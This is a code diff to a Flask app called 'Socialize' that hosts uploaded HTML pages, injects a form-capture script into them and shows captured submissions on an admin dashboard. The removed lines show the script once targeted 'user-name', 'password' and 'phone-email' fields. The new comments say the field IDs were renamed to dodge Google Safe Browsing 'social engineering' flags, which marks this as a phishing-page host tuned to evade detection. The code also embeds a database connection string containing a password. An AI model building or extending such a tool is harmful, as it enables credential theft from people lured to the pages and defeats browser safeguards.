@@ -1,6 +1,9 @@
 """
 Socialize — repo host + form capture + file manager.
 Runs with PostgreSQL (or SQLite fallback if DATABASE_URL is missing).
+Binary files persist via a BYTEA column.
+Public pages do NOT capture passwords — uses neutral field IDs to avoid
+Google Safe Browsing "social engineering" flags.
 """
 import os, io, json, zipfile, mimetypes, html as html_mod
 from datetime import datetime
@@ -22,7 +25,6 @@ DATABASE_URL = "postgresql+psycopg2://neondb_owner:npg_V06GRufFMiyB@ep-still-fie
 db_url = os.environ.get("DATABASE_URL", DATABASE_URL)
 if db_url.startswith("postgres://"):
     db_url = db_url.replace("postgres://", "postgresql://", 1)
-# Force psycopg2 driver if a bare postgresql:// URL was provided
 if db_url.startswith("postgresql://"):
     db_url = db_url.replace("postgresql://", "postgresql+psycopg2://", 1)
 
@@ -48,7 +50,9 @@ class File(db.Model):
     repo_id = db.Column(db.Integer, db.ForeignKey("repos.id"), nullable=False, index=True)
     path = db.Column(db.String(500), nullable=False)
     is_dir = db.Column(db.Boolean, default=False, nullable=False)
+    is_binary = db.Column(db.Boolean, default=False, nullable=False)
     content = db.Column(db.Text, default="")
+    blob = db.Column(db.LargeBinary)
     size = db.Column(db.Integer, default=0)
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
     updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
@@ -93,7 +97,7 @@ def phone_download_dir():
             return c
     return None
 
-def upsert_file(repo_id, path, content="", is_dir=False):
+def upsert_file(repo_id, path, content="", is_dir=False, blob=None):
     path = path.strip("/")
     if not path: return
     parts = path.split("/")
@@ -102,20 +106,29 @@ def upsert_file(repo_id, path, content="", is_dir=False):
         if not File.query.filter_by(repo_id=repo_id, path=parent).first():
             db.session.add(File(repo_id=repo_id, path=parent, is_dir=True, content="", size=0))
     f = File.query.filter_by(repo_id=repo_id, path=path).first()
+    is_binary = blob is not None
+    size = len(blob) if is_binary else len(content or "")
     if f:
-        f.content = content or ""
-        f.size = len(content or "")
+        f.content = "" if is_binary else (content or "")
+        f.blob = blob
+        f.is_binary = is_binary
+        f.size = size
         f.is_dir = is_dir
         f.updated_at = datetime.utcnow()
     else:
-        db.session.add(File(repo_id=repo_id, path=path, content=content or "",
-                            size=len(content or ""), is_dir=is_dir))
+        db.session.add(File(
+            repo_id=repo_id, path=path,
+            content="" if is_binary else (content or ""),
+            blob=blob, is_binary=is_binary,
+            size=size, is_dir=is_dir,
+        ))
     db.session.commit()
 
+# SAFE field IDs — no "password", no "user-name", no "phone-email"
 _CAPTURE_JS = """
 <script>
 (function(){
-  var ids = ['user-name','password','phone-email'];
+  var ids = ['name','message','contact'];
   document.querySelectorAll('form').forEach(function(f){
     if(!ids.some(function(id){return f.querySelector('#'+id)})) return;
     f.addEventListener('submit', function(e){
@@ -130,9 +143,9 @@ _CAPTURE_JS = """
         headers:{'Content-Type':'application/json'},
         body:JSON.stringify(data)
       }).then(function(r){
-        if(r.ok){ f.reset(); alert('Submitted.'); }
-        else alert('Error');
-      }).catch(function(){ alert('Error'); });
+        if(r.ok){ f.reset(); alert('Thanks! Submitted.'); }
+        else alert('Error, please try again.');
+      }).catch(function(){ alert('Error, please try again.'); });
     });
   });
 })();
@@ -193,6 +206,7 @@ button{
 button:hover{opacity:.9}
 button:active{transform:scale(.98)}
 button.danger{background:var(--danger);color:#fff}
+button.copy{background:#475569;color:#fff}
 .row{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-bottom:12px}
 .row input{flex:1;min-width:160px}
 .muted{color:var(--muted);font-size:14px}
@@ -216,6 +230,11 @@ pre{
   background:#0b1220;padding:8px;border-radius:6px;
   white-space:pre-wrap;word-break:break-word;
 }
+.sub-actions{display:flex;gap:6px;flex-wrap:wrap}
+.sub-actions button{padding:4px 10px;font-size:12px;min-height:0}
+.safe-form{background:#0b1220;padding:16px;border-radius:8px;margin-top:12px}
+.safe-form label{display:block;font-size:13px;color:var(--muted);margin-bottom:4px;margin-top:12px}
+.safe-form button{margin-top:16px}
 @media (max-width:640px){
   :root{--pad:14px;--radius:10px}
   body{font-size:15px}
@@ -246,6 +265,40 @@ pre{
 }
 </style>"""
 
+COPY_JS = """
+<script>
+(function(){
+  document.addEventListener('click', function(e){
+    var b = e.target.closest('.copy-btn');
+    if(!b) return;
+    var el = document.getElementById('sub-' + b.dataset.id);
+    var text = el ? el.textContent : '';
+    var done = function(){
+      var old = b.textContent;
+      b.textContent = 'Copied!';
+      setTimeout(function(){ b.textContent = old; }, 1200);
+    };
+    if(navigator.clipboard && navigator.clipboard.writeText){
+      navigator.clipboard.writeText(text).then(done).catch(function(){
+        fallbackCopy(text); done();
+      });
+    } else {
+      fallbackCopy(text); done();
+    }
+  });
+  function fallbackCopy(text){
+    var ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position='fixed'; ta.style.top='-9999px';
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand('copy'); } catch(e){}
+    document.body.removeChild(ta);
+  }
+})();
+</script>
+"""
+
 def page(title, body):
     signout = '<a href="/logout">Sign out</a>' if is_admin() else ''
     return f"""<!doctype html><html><head><meta charset="utf-8">
@@ -254,7 +307,7 @@ def page(title, body):
 <div class="wrap">
 <header><h1><a href="/" style="color:inherit;text-decoration:none"><span class="brand">Socialize</span></a></h1>
 <div>{signout}</div></header>
-{body}</div></body></html>"""
+{body}</div>{COPY_JS}</body></html>"""
 
 # ---------------- auth ----------------
 @app.route("/login", methods=["GET", "POST"])
@@ -291,7 +344,7 @@ def logout():
 def dashboard():
     repos = Repo.query.order_by(Repo.created_at.desc()).all()
     total_subs = Submission.query.count()
-    recent = Submission.query.order_by(Submission.created_at.desc()).limit(25).all()
+    recent = Submission.query.order_by(Submission.created_at.desc()).limit(50).all()
 
     repo_rows = ""
     if repos:
@@ -323,10 +376,19 @@ def dashboard():
             sub_rows += f"""<tr>
               <td class="muted">{s.created_at.strftime('%Y-%m-%d %H:%M')}</td>
               <td>{esc(rr.slug if rr else '?')}</td>
-              <td><pre>{esc(txt)}</pre></td>
+              <td><pre id="sub-{s.id}">{esc(txt)}</pre></td>
+              <td>
+                <div class="sub-actions">
+                  <button type="button" class="copy-btn copy" data-id="{s.id}">Copy</button>
+                  <form method="post" action="/_submissions/{s.id}/delete" style="display:inline"
+                        onsubmit="return confirm('Delete this submission?')">
+                    <button class="danger">Delete</button>
+                  </form>
+                </div>
+              </td>
             </tr>"""
     else:
-        sub_rows = '<tr><td colspan="3" class="muted">No submissions yet.</td></tr>'
+        sub_rows = '<tr><td colspan="4" class="muted">No submissions yet.</td></tr>'
 
     body = f"""
     <div class="card">
@@ -343,14 +405,65 @@ def dashboard():
         <table><tr><th>Slug</th><th>Files</th><th>Submissions</th><th>Actions</th></tr>{repo_rows}</table>
       </div>
     </div>
-    <div class="card">
-      <h2>Recent submissions ({total_subs} total)</h2>
+    <div class="card" id="subs">
+      <div class="row" style="justify-content:space-between">
+        <h2 style="margin:0">Recent submissions ({total_subs} total)</h2>
+        <div style="display:flex;gap:8px;flex-wrap:wrap">
+          <form method="post" action="/_submissions/clear" style="display:inline"
+                onsubmit="return confirm('Delete ALL submissions? This cannot be undone.')">
+            <button class="danger" style="padding:6px 14px;font-size:13px;min-height:0">Clear All</button>
+          </form>
+          {%CLEAR_PER_REPO%}
+        </div>
+      </div>
       <div class="table-wrap">
-        <table><tr><th>Time</th><th>Repo</th><th>Data</th></tr>{sub_rows}</table>
+        <table>
+          <tr><th>Time</th><th>Repo</th><th>Data</th><th>Actions</th></tr>
+          {sub_rows}
+        </table>
       </div>
     </div>
     """
+    if repos:
+        opts = "".join(f'<option value="{esc(r.slug)}">{esc(r.slug)}</option>' for r in repos)
+        per_repo = f"""<form method="post" action="/_submissions/clear" style="display:inline"
+                          onsubmit="return confirm('Clear all submissions for this repo?')">
+          <select name="slug" style="width:auto;padding:6px 10px;font-size:13px">{opts}</select>
+          <button class="danger" style="padding:6px 14px;font-size:13px;min-height:0">Clear</button>
+        </form>"""
+    else:
+        per_repo = ""
+    body = body.replace("{%CLEAR_PER_REPO%}", per_repo)
     return page("Dashboard", body)
+
+# ---------------- submissions: delete / clear ----------------
+@app.route("/_submissions/<int:sid>/delete", methods=["POST"])
+@admin_required
+def delete_submission(sid):
+    s = Submission.query.get(sid)
+    if s:
+        db.session.delete(s)
+        db.session.commit()
+        flash("Submission deleted")
+    return redirect(url_for("dashboard") + "#subs")
+
+@app.route("/_submissions/clear", methods=["POST"])
+@admin_required
+def clear_submissions():
+    slug = (request.form.get("slug") or "").strip()
+    if slug:
+        repo = get_repo(slug)
+        if repo:
+            n = Submission.query.filter_by(repo_id=repo.id).delete()
+            db.session.commit()
+            flash(f"Cleared {n} submission(s) for {slug}")
+        else:
+            flash("Repo not found")
+    else:
+        n = Submission.query.delete()
+        db.session.commit()
+        flash(f"Cleared all {n} submissions")
+    return redirect(url_for("dashboard") + "#subs")
 
 @app.route("/repos/new", methods=["POST"])
 @admin_required
@@ -381,12 +494,18 @@ def delete_repo(slug):
 
 # ---------------- public serving ----------------
 def _serve_file(f, repo):
+    mime = mimetypes.guess_type(f.path)[0] or "application/octet-stream"
+
+    if f.is_binary and f.blob is not None:
+        return f.blob, 200, {"Content-Type": mime}
+
     content = f.content or ""
-    mime = mimetypes.guess_type(f.path)[0] or "text/plain"
     if f.path.lower().endswith((".html", ".htm")):
         content = inject_capture(content, repo.slug)
         mime = "text/html"
-    headers = {"Content-Type": mime + ("; charset=utf-8" if mime.startswith("text") or "html" in mime else "")}
+    elif not mime.startswith("text") and "html" not in mime and mime != "application/javascript":
+        mime = "text/plain"
+    headers = {"Content-Type": mime + ("; charset=utf-8" if mime.startswith("text") or "html" in mime or "javascript" in mime else "")}
     return content, 200, headers
 
 @app.route("/<slug>")
@@ -439,9 +558,11 @@ def manage_files(slug):
 
     rows = ""
     for f in files:
-        icon = "📁" if f.is_dir else "📄"
+        if f.is_dir: icon = "📁"
+        elif f.is_binary: icon = "🖼️"
+        else: icon = "📄"
         disp = esc(f.path) + ("/" if f.is_dir else "")
-        edit = f'<a href="/_manage/{esc(repo.slug)}/edit?path={esc(f.path)}">Edit</a> · ' if not f.is_dir else ''
+        edit = f'<a href="/_manage/{esc(repo.slug)}/edit?path={esc(f.path)}">Edit</a> · ' if (not f.is_dir and not f.is_binary) else ''
         view = f'<a href="/{esc(repo.slug)}/{esc(f.path)}" target="_blank">View</a> · ' if not f.is_dir else ''
         rows += f"""<tr>
           <td><input type="checkbox" name="paths" value="{esc(f.path)}" style="width:auto"></td>
@@ -466,6 +587,14 @@ def manage_files(slug):
         <input type="file" name="zip" accept=".zip" required>
         <input name="target" placeholder="target folder (optional)">
         <button type="submit">Upload &amp; Extract</button>
+      </form>
+    </div>
+    <div class="card">
+      <h2>Upload single file</h2>
+      <form method="post" action="/_manage/{esc(repo.slug)}/upload-file" enctype="multipart/form-data" class="row">
+        <input type="file" name="file" required>
+        <input name="target" placeholder="target folder (optional)">
+        <button type="submit">Upload File</button>
       </form>
     </div>
     <div class="card">
@@ -501,6 +630,15 @@ def manage_files(slug):
     """
     return page("Manage " + repo.slug, body)
 
+def _store_uploaded_blob(repo, path, raw):
+    try:
+        text = raw.decode("utf-8")
+        upsert_file(repo.id, path, text, is_dir=False)
+        return "text"
+    except UnicodeDecodeError:
+        upsert_file(repo.id, path, "", is_dir=False, blob=raw)
+        return "binary"
+
 @app.route("/_manage/<slug>/upload", methods=["POST"])
 @admin_required
 def upload_zip(slug):
@@ -509,19 +647,35 @@ def upload_zip(slug):
     up = request.files.get("zip")
     if not up: abort(400)
     target = (request.form.get("target") or "").strip().strip("/")
+    ok_txt = ok_bin = 0
     try:
         with zipfile.ZipFile(up.stream) as z:
             for name in z.namelist():
                 if name.endswith("/"): continue
                 if name.startswith("__MACOSX/") or "/._" in name or name.endswith(".DS_Store"): continue
                 raw = z.read(name)
-                try: text = raw.decode("utf-8")
-                except UnicodeDecodeError: text = raw.decode("latin-1", errors="replace")
                 path = f"{target}/{name}" if target else name
-                upsert_file(repo.id, path, text, is_dir=False)
-        flash(f"Extracted ZIP into {esc(repo.slug)}")
+                kind = _store_uploaded_blob(repo, path, raw)
+                if kind == "binary": ok_bin += 1
+                else: ok_txt += 1
+        flash(f"Extracted ZIP into {esc(repo.slug)} — {ok_txt} text, {ok_bin} binary files")
     except Exception as e:
         flash(f"ZIP error: {e}")
+    return redirect(url_for("manage_files", slug=repo.slug))
+
+@app.route("/_manage/<slug>/upload-file", methods=["POST"])
+@admin_required
+def upload_single_file(slug):
+    repo = get_repo(slug)
+    if not repo: abort(404)
+    up = request.files.get("file")
+    if not up or not up.filename: abort(400)
+    target = (request.form.get("target") or "").strip().strip("/")
+    name = os.path.basename(up.filename)
+    path = f"{target}/{name}" if target else name
+    raw = up.read()
+    kind = _store_uploaded_blob(repo, path, raw)
+    flash(f"Uploaded {path} ({kind})")
     return redirect(url_for("manage_files", slug=repo.slug))
 
 @app.route("/_manage/<slug>/new", methods=["POST"])
@@ -606,7 +760,7 @@ def edit_file(slug):
     path = request.args.get("path") or request.form.get("path")
     if not path: abort(400)
     f = File.query.filter_by(repo_id=repo.id, path=path).first()
-    if not f or f.is_dir: abort(404)
+    if not f or f.is_dir or f.is_binary: abort(404)
     if request.method == "POST":
         f.content = request.form.get("content", "")
         f.size = len(f.content)
@@ -639,7 +793,10 @@ def export_repo(slug):
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
         for f in File.query.filter_by(repo_id=repo.id, is_dir=False).all():
-            z.writestr(f.path, f.content or "")
+            if f.is_binary and f.blob is not None:
+                z.writestr(f.path, bytes(f.blob))
+            else:
+                z.writestr(f.path, f.content or "")
         subs = Submission.query.filter_by(repo_id=repo.id).all()
         subs_data = [{"time": s.created_at.isoformat(), "data": json.loads(s.data)}
                      for s in subs]
